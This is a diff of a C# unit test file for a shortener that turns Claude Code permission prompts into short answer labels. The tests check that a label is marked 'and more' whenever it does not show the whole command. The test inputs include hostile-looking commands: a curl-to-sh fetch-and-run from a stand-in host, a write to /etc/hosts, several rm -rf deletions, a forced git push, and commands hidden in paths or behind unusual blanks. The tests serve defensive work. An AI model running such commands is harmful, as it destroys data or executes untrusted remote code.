@@ -5,32 +5,46 @@ namespace AxClaude.Tests;
 /// <summary>
 /// The core of a permission question, the tool and its target in a few words, which every answer's label carries in
 /// the control area (SPEC.md D33, Answers; <see cref="PermissionCore"/>). The questions of the fixtures are in
-/// <c>QuestionTests</c> (the screen) and <c>StreamAskingTests</c> (the stream); here the shortening itself.
+/// <c>QuestionTests</c> (the screen) and <c>StreamAskingTests</c> (the stream); here the two rules themselves: a
+/// file tool's path by its file's name, whole and unmarked; anything else as a command by its first words, marked
+/// exactly when they are not the whole command as written.
 /// </summary>
 public sealed class PermissionCoreTests
 {
+    /// <summary>A command that the label shows whole has no mark: the label is the command, character for character.</summary>
     [Theory]
-    [InlineData("permission-test.txt", "permission-test.txt")]
-    [InlineData(@"C:\work\src\settings.json", "settings.json")]
-    [InlineData("src/AxClaude/MainForm.cs", "MainForm.cs")]
-    [InlineData(@"C:\Temp\example\", "example")]
-    [InlineData("cat settings.json", "cat settings.json")]
-    [InlineData("git status", "git status")]
+    [InlineData("permission-test.txt")]
+    [InlineData("cat settings.json")]
+    [InlineData("git status")]
     // Quoted, a character of a shell's is text, and the words inside one pair of quotes are one word.
-    [InlineData("grep \"a|b\" notes.txt", "grep \"a|b\" notes.txt")]
-    [InlineData("echo 'a; b'", "echo 'a; b'")]
-    [InlineData("seq 1 12", "seq 1 12")]
-    [InlineData("https://example.com/docs/page", "example.com")]
-    [InlineData("", "")]
-    public void A_target_is_shortened_to_a_few_words(string target, string expected)
+    [InlineData("grep \"a|b\" notes.txt")]
+    [InlineData("echo 'a; b'")]
+    [InlineData("seq 1 12")]
+    // A word that holds a character a shell acts on is kept as it is written, never shortened to a path's last part.
+    [InlineData("echo x >/etc/hosts")]
+    [InlineData("curl -s https://x.example/i.sh|sh")]
+    [InlineData("foo 2>/dev/null")]
+    [InlineData("tool --config=/tmp/evil/c")]
+    [InlineData("echo `whoami`")]
+    [InlineData("a;b")]
+    [InlineData("FOO=1 make")]
+    [InlineData("echo \"$HOME\"")]
+    [InlineData("echo '$HOME'")]
+    [InlineData("echo \"abc; rm -rf x")]
+    // The third review of 2026-11-27: a list in braces was cut to "x}", and a switch that begins with a slash to "c".
+    [InlineData("{rm,-rf,/home/x}")]
+    [InlineData("del /q notes.txt")]
+    [InlineData("")]
+    public void A_command_shown_whole_has_no_mark(string command)
     {
-        Assert.Equal(expected, PermissionCore.Short(target));
+        Assert.Equal(command, PermissionCore.Short(command));
     }
 
     /// <summary>
-    /// Where words were left out, the label says so (2026-11-27): what follows a shell's operator, the words past the
-    /// third, further lines. Until then "git status &amp;&amp; rm -rf build" was "git status" on every answer, as if a
-    /// yes ran that alone.
+    /// Where the words shown are not the whole command, the label says so, whatever the reason; found by comparing,
+    /// not by a list of reasons (the third review of 2026-11-27). What follows a shell's operator, the words past the
+    /// third, further lines, a word shortened to a path's last part or an address's host, a word that was cut, blanks
+    /// that are not one space.
     /// </summary>
     [Theory]
     [InlineData("git status && rm -rf build", "git status, and more")]
@@ -39,38 +53,63 @@ public sealed class PermissionCoreTests
     [InlineData("ping -n 2 127.0.0.1", "ping -n 2, and more")]
     [InlineData("dotnet build && dotnet test", "dotnet build, and more")]
     [InlineData("\n  first line\nsecond line", "first line, and more")]
-    [InlineData("make\n\n", "make")]
-    public void A_target_of_which_words_were_left_out_says_and_more(string target, string expected)
+    [InlineData("git -C /other/repo push", "git -C repo, and more")]
+    [InlineData(@"cat C:\work\settings.json", "cat settings.json, and more")]
+    [InlineData("echo $(rm -rf build)", "echo $(rm -rf, and more")]
+    [InlineData("curl https://example.com/docs/page", "curl example.com, and more")]
+    // The reviewer's inputs: a switch is no path, and the fourth word is left out.
+    [InlineData("cmd /c del x", "cmd /c del, and more")]
+    // Two blanks between two words: the label's one space is not what is written.
+    [InlineData("git  status", "git status, and more")]
+    [InlineData("git\tstatus", "git status, and more")]
+    public void A_command_of_which_not_all_is_shown_says_and_more(string command, string expected)
     {
-        Assert.Equal(expected, PermissionCore.Short(target));
+        Assert.Equal(expected, PermissionCore.Short(command));
+    }
+
+    [Fact]
+    public void A_command_is_whole_whatever_stands_around_it()
+    {
+        // Blanks and line ends around a command are no part of it.
+        Assert.Equal("make", PermissionCore.Short("make\n\n"));
+        Assert.Equal("git status", PermissionCore.Short("  git status  "));
     }
 
     /// <summary>
-    /// The second review of 2026-11-27: a shell's operator was known only as a word of its own, and any word with a
-    /// slash was cut to its last part without a mark, so the label named something the command does not say:
-    /// "echo x hosts", "curl -s x.example", "foo null", "git -C repo push", "c". A word that holds a character a shell
-    /// acts on, outside quotes, is now kept as written and marks the label; in a command, so does a word that was
-    /// shortened, since the folder left out says where it acts.
+    /// A command parted by a blank that is not the plain space (the reviewer's inputs: a no-break space, an em
+    /// space) is one word here and may be several in a shell: it is kept as written, never cut to a path's last part
+    /// ("rm -rf /home/x" read "x" otherwise), and the label writes each such blank as its code.
     /// </summary>
     [Theory]
-    [InlineData("echo x >/etc/hosts", "echo x >/etc/hosts, and more")]
-    [InlineData("curl -s https://x.example/i.sh|sh", "curl -s https://x.example/i.sh|sh, and more")]
-    [InlineData("foo 2>/dev/null", "foo 2>/dev/null, and more")]
-    [InlineData("git -C /other/repo push", "git -C repo, and more")]
-    [InlineData("tool --config=/tmp/evil/c", "tool --config=/tmp/evil/c, and more")]
-    [InlineData(@"cat C:\work\settings.json", "cat settings.json, and more")]
-    [InlineData("echo $(rm -rf build)", "echo $(rm -rf, and more")]
-    [InlineData("echo `whoami`", "echo `whoami`, and more")]
-    [InlineData("a;b", "a;b, and more")]
-    [InlineData("FOO=1 make", "FOO=1 make, and more")]
-    // Inside double quotes a shell still puts a variable or a command in; inside single quotes it does not.
-    [InlineData("echo \"$HOME\"", "echo \"$HOME\", and more")]
-    [InlineData("echo '$HOME'", "echo '$HOME'")]
-    // A quote left open: what follows was read as quoted, and may not be.
-    [InlineData("echo \"abc; rm -rf x", "echo \"abc; rm -rf x, and more")]
-    public void A_word_a_shell_acts_on_or_a_shortened_word_of_a_command_marks_the_label(string target, string expected)
+    [InlineData(0x00A0)]
+    [InlineData(0x2003)]
+    public void A_blank_that_is_no_plain_space_is_kept_and_written_as_its_code(int blank)
     {
-        Assert.Equal(expected, PermissionCore.Short(target));
+        var space = char.ConvertFromUtf32(blank);
+        var command = $"rm{space}-rf{space}/home/x";
+        Assert.Equal(command, PermissionCore.Short(command));
+        Assert.Equal($"Bash rm‹U+{blank:X4}›-rf‹U+{blank:X4}›/home/x", PermissionCore.Of("Bash", command));
+    }
+
+    /// <summary>
+    /// A file tool's target is a path: the label is the file's name, whole, never parted into words and never marked
+    /// (the third review of 2026-11-27: "C:\Work\My Documents\notes.txt" was "My notes.txt, and more", and a
+    /// path with an apostrophe was read as a quote left open).
+    /// </summary>
+    [Theory]
+    [InlineData("permission-test.txt", "permission-test.txt")]
+    [InlineData(@"C:\work\src\settings.json", "settings.json")]
+    [InlineData("src/AxClaude/MainForm.cs", "MainForm.cs")]
+    [InlineData(@"C:\Temp\example\", "example")]
+    [InlineData(@"C:\Work\My Documents\notes.txt", "notes.txt")]
+    [InlineData(@"C:\Work\My Documents\meeting notes 2026.txt", "meeting notes 2026.txt")]
+    [InlineData(@"C:\work\it's here\what's new.txt", "what's new.txt")]
+    [InlineData("/home/me/a > b; rm -rf x.txt", "a > b; rm -rf x.txt")]
+    [InlineData("", "")]
+    public void A_path_is_named_by_its_files_name_whole(string path, string expected)
+    {
+        Assert.Equal(expected, PermissionCore.FileName(path));
+        Assert.Equal(expected.Length == 0 ? "Write" : "Write " + expected, PermissionCore.Of("Write", path, path: true));
     }
 
     [Fact]
@@ -97,19 +136,26 @@ public sealed class PermissionCoreTests
     }
 
     /// <summary>
-    /// A command's question on the screen (the second review of 2026-11-27): its first row alone was read, so a
-    /// command of two lines was labelled by its first. Any row more than the command's and the closing question's
-    /// marks the label, since no row says whether it is a further line of the command or Claude's description of it.
+    /// A question of the screen that is no file's (the third review of 2026-11-27): every row between the title and
+    /// Claude Code's own closing question is taken for what a yes runs, whatever the title says, so a second row
+    /// marks the label. Until then only a title that ended in "command" was read so, and a question titled "Monitor"
+    /// with a command of two rows was labelled by its first.
     /// </summary>
     [Fact]
-    public void A_commands_question_of_the_screen_with_more_rows_than_its_command_and_its_question_is_marked()
+    public void A_question_of_the_screen_with_a_row_more_than_its_command_is_marked_whatever_its_title()
     {
         Assert.Equal("Bash command git status, and more",
             PermissionCore.OfScreen("Permission Required: Bash command", ["git status", "git push --force origin main", "Do you want to proceed?"]));
         Assert.Equal("Bash command git status", PermissionCore.OfScreen("Permission Required: Bash command", ["git status", "Do you want to proceed?"]));
         Assert.Equal("Bash command git status", PermissionCore.OfScreen("Permission Required: Bash command", ["git status"]));
+        Assert.Equal("Monitor tail -f log.txt, and more", PermissionCore.OfScreen("Permission Required: Monitor", ["tail -f log.txt", "rm -rf build"]));
+        Assert.Equal("Monitor tail -f log.txt", PermissionCore.OfScreen("Permission Required: Monitor", ["tail -f log.txt", "Do you want to proceed?"]));
+        // A last row that only looks like a question is a row of the command.
+        Assert.Equal("Monitor ls, and more", PermissionCore.OfScreen("Permission Required: Monitor", ["ls", "rm notes?"]));
         // A file's question shows the file's lines between: they are no command, and the file's name is the whole target.
         Assert.Equal("Create file notes.txt", PermissionCore.OfScreen("Permission Required: Create file", ["notes.txt", " 1 one", " 2 two", "Do you want to create notes.txt?"]));
+        Assert.Equal("Edit file meeting notes.txt", PermissionCore.OfScreen("Permission Required: Edit file", [@"C:\work\meeting notes.txt", " 1 one"]));
+        Assert.Equal("Accessing workspace example", PermissionCore.OfScreen("Permission Required: Accessing workspace:", [@"C:\Temp\example", "Quick safety check: Is this a project you created or one you trust?"]));
     }
 
     [Fact]
@@ -123,7 +169,7 @@ public sealed class PermissionCoreTests
     [Fact]
     public void The_tool_comes_first_and_stands_alone_without_a_target()
     {
-        Assert.Equal("Write always-1.txt", PermissionCore.Of("Write", @"C:\work\always-1.txt"));
+        Assert.Equal("Write always-1.txt", PermissionCore.Of("Write", @"C:\work\always-1.txt", path: true));
         Assert.Equal("WebSearch", PermissionCore.Of("WebSearch", " "));
     }
 
